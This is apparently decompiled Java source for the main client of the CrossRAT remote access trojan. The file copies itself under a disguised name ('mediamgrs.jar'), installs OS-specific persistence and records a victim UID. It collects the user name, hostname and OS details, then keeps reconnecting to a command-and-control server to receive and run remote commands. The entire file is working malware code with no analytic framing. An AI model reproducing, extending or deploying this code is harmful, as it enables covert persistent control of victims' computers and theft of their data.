package crossrat;

import java.awt.GraphicsEnvironment;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.UUID;
import java.util.prefs.Preferences;

public class client {
   public static void main(String[] var0) {
      a.a var15 = a.c.b();
      String var1 = "java.io.tmpdir";
      var1 = System.getProperty("java.io.tmpdir");
      String var2 = URLDecoder.decode(client.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "UTF-8");
      File var20 = new File(var2);
      k.K = "";
      String var16;
      if (var15.a() == a.c.a) {
         k.K = var1 + "\\";
      } else if (var15.a() == a.c.b) {
         var16 = System.getProperty("user.home");
         k.K = var16 + "/Library/";
      } else {
         k.K = "/usr/var/";
      }

      File var17 = new File(k.K + "mediamgrs.jar");

      try {
         org.a.a.a.b.a(var20, var17);
      } catch (Exception var11) {
         var11.printStackTrace();
      }

      try {
         String var10001 = var17.toString();
         boolean var18 = true;
         String var7 = var10001;
         var16 = "mediamgrs";
         a.a var8;
         Object var19;
         if ((var8 = a.c.b()).a() == a.c.a) {
            var19 = new b.e(var16, var7, true);
         } else if (var8.a() == a.c.b) {
            var19 = new b.c(var16, var7, true);
         } else if (var8.d() && !GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance()) {
            var19 = new b.d(var16, var7, true);
         } else {
            if (!var8.d()) {
               throw new RuntimeException("Unknown operating system " + var8.c());
            }

            var19 = new b.b(var16, var7, true);
         }

         ((b.a)var19).a();
      } catch (Exception var14) {
         var14.printStackTrace();
      }

      if ((k.g = (k.h = Preferences.userRoot()).get("UID", (String)null)) == null) {
         k.g = (k.f = UUID.randomUUID()).toString();
         k.h.put("UID", k.g);
      }

      var1 = System.getProperty("os.name");
      var2 = System.getProperty("os.version");
      var16 = System.getProperty("user.name");
      String var3 = InetAddress.getLocalHost().getHostName();
      var3 = var16 + "^" + var3;

      while(true) {
         try {
            while(true) {
               Socket var4;
               (var4 = new Socket(k.b, k.c)).setSoTimeout(120000);
               k.k = var4;
               (new DataOutputStream(var4.getOutputStream())).writeBytes(k.g + k.d + k.w + k.d + e.b() + k.d + var1 + k.d + var2 + k.d + var3 + k.d + k.i + k.d + k.j + k.d + "&&&");
               BufferedReader var5 = new BufferedReader(new InputStreamReader(var4.getInputStream()));
               PrintStream var6 = new PrintStream(var4.getOutputStream(), true);

               try {
                  while(true) {
                     var16 = var5.readLine();

                     try {
                        String[] var21;
                        if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) {
                           new e();
                           e.a();
                           (new f()).start();
                        } else if (var21[0].equals(k.n)) {
                           (new c(var21[1])).start();
                        } else if (var21[0].equals(k.o)) {
                           (new a(var21[1])).start();
                        } else if (var21[0].equals(k.p)) {
                           (new b(var21[1], var21[2])).start();
                        } else if (var21[0].equals(k.q)) {
                           (new h(var21[1], var21[2])).start();
                        } else if (var21[0].equals(k.r)) {
                           (new d(k.b, k.c, var21[1], var21[2], var21[3], "0")).start();
                        } else if (var21[0].equals(k.s)) {
                           (new d(k.b, k.c, var21[1], var21[2], var21[3], "1")).start();
                        } else if (var21[0].equals(k.t)) {
                           (new g()).start();
                        } else if (var21[0].equals(k.u)) {
                           (new j(k.b, k.c)).start();
                        } else if (var21[0].equals(k.v)) {
                           (new i(var21[1])).start();
                        }
                     } catch (Exception var10) {
                        ;
                     }
                  }
               } catch (Exception var12) {
                  System.out.println("ERROR");
                  var4.close();
                  var6.close();
                  var5.close();
                  var5.close();
                  var6.close();
                  var4.close();
               }
            }
         } catch (Exception var13) {
            try {
               Thread.sleep(5000L);
            } catch (InterruptedException var9) {
               ;
            }
         }
      }
   }
}
